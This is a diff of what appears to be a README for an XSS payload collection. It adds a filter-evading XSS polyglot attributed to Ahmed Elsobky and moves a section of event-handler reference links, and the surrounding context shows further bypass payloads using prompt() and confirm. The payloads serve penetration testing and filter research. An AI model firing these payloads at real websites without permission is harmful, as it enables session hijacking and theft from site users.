@@ -49,6 +49,15 @@ Put this repo on watch. I will be updating it regularly.
 <script y="><">/*<script* */prompt()</script
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
 ```
+Here's an interesting XSS polyglot by [Ahmed Elsobky](https://github.com/0xsobky/):
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+### Awesome Tags & Event Handlers
+- [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
+- [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)
+
 
 Some HTML Tags that you will be using
 ```
@@ -101,11 +110,6 @@ new class extends confirm``{}
 
 ### Awesome Exploits
 A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)
-
-### Awesome Tags & Event Handlers
-- [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
-- [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)
-
 
 ### Awesome Probing
 If nothing of this works, take a look at **Awesome Bypassing** section
